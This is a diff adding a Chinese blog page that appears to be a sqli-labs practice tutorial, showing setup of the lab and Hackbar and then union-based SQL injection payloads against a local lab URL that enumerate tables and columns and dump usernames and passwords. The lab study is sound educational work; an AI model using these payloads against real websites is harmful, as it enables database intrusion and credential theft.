@@ -1,0 +1,285 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8" />
+    <title>sql注入 | k-onlの狗窝</title>
+    <meta name="author" content="k-onl" />
+    <meta name="description" content="" />
+    <meta name="keywords" content="" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <link rel="icon" href="/images/fufu1.jpg" />
+    <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.7/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.2/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+
+
+<script src="/js/lib/preview.js"></script>
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/css/main.css" />
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+<body>
+    <div id="layout">
+        <transition name="fade">
+            <div id="loading" v-show="loading">
+                <div id="loading-circle">
+                    <h2>LOADING</h2>
+                    <p>加载过慢请开启缓存 浏览器默认开启</p>
+                    <img src="/images/lolisister1.gif" />
+                </div>
+            </div>
+        </transition>
+        <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>K-ONLの狗窝</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;Home</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;About</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;搜索</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;Categories</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;Tags</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;K-ONLの狗窝</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">搜索</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+        <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+            <div class="article">
+    <div>
+        <h1>sql注入</h1>
+    </div>
+    <div class="info">
+        <span class="date">
+            <span class="icon">
+                <i class="fa-solid fa-calendar fa-fw"></i>
+            </span>
+            2023/12/20
+        </span>
+        
+        
+    </div>
+    
+    <div class="content" v-pre>
+        <ul>
+<li>、</li>
+</ul>
+<h2 id="安装sqli并初始化"><a href="#安装sqli并初始化" class="headerlink" title="安装sqli并初始化"></a>安装sqli并初始化</h2><p>将sqli压缩包解压至小皮的网站根目录（WWW）下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220203418109.png" alt="image-20231220203418109"></p>
+<p>随后打开浏览器进入sqli</p>
+<p>点击Setup&#x2F;reset Database for labs即可配置数据库 </p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220203446053.png" alt="image-20231220203446053"></p>
+<p>出现这个页面表示初始化成功</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220203721711.png" alt="image-20231220203721711"></p>
+<p>初始化返回后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220203856388.png" alt="image-20231220203856388"></p>
+<h2 id="安装Hackbar"><a href="#安装Hackbar" class="headerlink" title="安装Hackbar"></a>安装Hackbar</h2><p>与正常的拓展插件一样的插入方法一样，直接拖入或者选择导入</p>
+<p>我这里使用火狐</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220204112885.png" alt="image-20231220204112885"></p>
+<p>随意打开一个页面右键检查或者f12即可看到</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220204206891.png" alt="image-20231220204206891"></p>
+<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="字符型与数字型sql注入"><a href="#字符型与数字型sql注入" class="headerlink" title="字符型与数字型sql注入"></a>字符型与数字型sql注入</h3><p>根据提示输入id</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220204845153.png" alt="image-20231220204845153"></p>
+<p>得到一个正确的返回</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220204908242.png" alt="image-20231220204908242"></p>
+<p>点击load url 将地址拷贝在当前输入框中，点击Execute执行</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220204952246.png" alt="image-20231220204952246"></p>
+<p>可以看出是字符型sql注入（id被”包裹”）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220205130119.png" alt="image-20231220205130119"></p>
+<p>sql语句为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE id=&#x27;id&#x27; </span><br><span class="line">当我们将id的部分传入一个时1&#x27; or true -- -</span><br><span class="line">sql语句变为了SELECT * FROM users WHERE id=&#x27;1&#x27; or true -- -&#x27; </span><br><span class="line">执行条件变为了1或者任意（true）</span><br><span class="line">-- - 为注释后边的代码</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>sql注入步骤</p>
+<ol>
+<li>使用grody by确定当前数据库的列数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用order by来确定当前表的字段个数</span><br><span class="line">order by * 表示列出当前表的第*个字段</span><br></pre></td></tr></table></figure>
+
+<p>我的表为6个字段</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220210211626.png" alt="image-20231220210211626"></p>
+<p>当我输入order by 7时，出现错误</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220210247298.png" alt="image-20231220210247298"></p>
+<ol start="2">
+<li>确定返回值个数</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union  select 1,2,3 ,4,5,6 //表示直接输出1 2 3 4 5 6</span><br><span class="line">//union表示在sql语句里插入一个查询语句</span><br><span class="line">//select后面数字的个数为使用order by确定的字段个数</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<ol start="3">
+<li>得到表名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.190/sqli/Less-1/?id=88&#x27;  union  select 1,2,3 ,4,5,6-- -</span><br><span class="line">//id的值不能为正确的，否则会将返回值全部占用</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以确定返回值为两个，并且为第2位和第3位</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220211159158.png" alt="image-20231220211159158"></p>
+<p>接下来就可以进行通用sql注入方法了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">//查询当前数据库下的所有表名</span><br><span class="line">select 1,group_concat(table_name) ,3,4,5,6 from information_schema.tables where table_schema=database();</span><br><span class="line">//这里将select1到6中的第2位进行了替换，因为只有第2位和第3位有回显</span><br><span class="line">// information_schema.tables where table_schema=database();表示查询当前数据库中的所有表</span><br><span class="line">//table_schema=database();	查询当前数据库</span><br><span class="line">//information_schema.tables查询表</span><br><span class="line">//group_concat(table_name)表示将查询结果使用字符串进行拼接（相当于只返回了一个结果集）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//完整使用方法</span><br><span class="line">http://192.168.2.190/sqli/Less-1/?id=88&#x27;  union  select 1,group_concat(table_name) ,3,4,5,6 from information_schema.tables where table_schema=database(); -- -</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>可以看到输出了当前数据库下的所有表名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220212028499.png" alt="image-20231220212028499"></p>
+<p>从刚刚登录成功的页面可以知道表名为users</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220212514250.png" alt="image-20231220212514250"></p>
+<ol start="4">
+<li>得到所有字段名</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//查询当前数据库下表名为’users‘的所有字段名</span><br><span class="line">select 1,group_concat(column_name) ,3,4,5,6 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database();</span><br><span class="line"></span><br><span class="line">//table_schema=database();	查询当前数据库</span><br><span class="line">//table_name=&#x27;users&#x27; 		表名为users</span><br><span class="line">//information_schema.columns  查询所有字段</span><br><span class="line">//group_concat(table_name)表示将查询结果使用字符串进行拼接（相当于只返回了一个结果集）</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//完整使用方法</span><br><span class="line">http://192.168.2.190/sqli/Less-1/?id=88&#x27;  union  select 1,group_concat(column_name) ,3,4,5,6  from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=database(); -- -</span><br></pre></td></tr></table></figure>
+
+<p>于是我们可以得到users表里所有的字段名</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220212730713.png" alt="image-20231220212730713"></p>
+<ol start="6">
+<li>获取字段里的数据</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//查询当前表下字段的数据</span><br><span class="line">select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 from users;-- -</span><br><span class="line"></span><br><span class="line">//完整使用</span><br><span class="line">http://192.168.2.190/sqli/Less-1/?id=88&#x27;  union  select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password),3 ,4,5,6 from users; -- -</span><br></pre></td></tr></table></figure>
+
+<p>得到了id username password的所有数据</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220213720935.png" alt="image-20231220213720935"></p>
+<p>数字型注入与字符型类似，区别为字符型注入时需要加引号  ’ ‘ 而数字型不需要</p>
+<p>数字型：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220214156737.png" alt="image-20231220214156737"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/k-onl/image@main//myimage/image-20231220214121727.png" alt="image-20231220214121727"></p>
+
+    </div>
+    
+    
+    
+    
+    
+    
+    
+</div>
+
+            <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            &copy;
+            2022 - 2023 k-onlの狗窝
+            <span id="footer-icon">
+                <i class="fa-solid fa-font-awesome fa-fw"></i>
+            </span>
+            &commat;k-onl
+        </div>
+        <div>
+            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX Theme</a>
+        </div>
+        
+    </div>
+</footer>
+
+        </div>
+        
+        <transition name="fade">
+            <div id="preview" ref="preview" v-show="previewShow">
+                <img id="preview-content" ref="previewContent" />
+            </div>
+        </transition>
+        
+    </div>
+    <script src="/js/main.js"></script>
+    
+    
+
+
+
+
+    
+</body>
+</html>
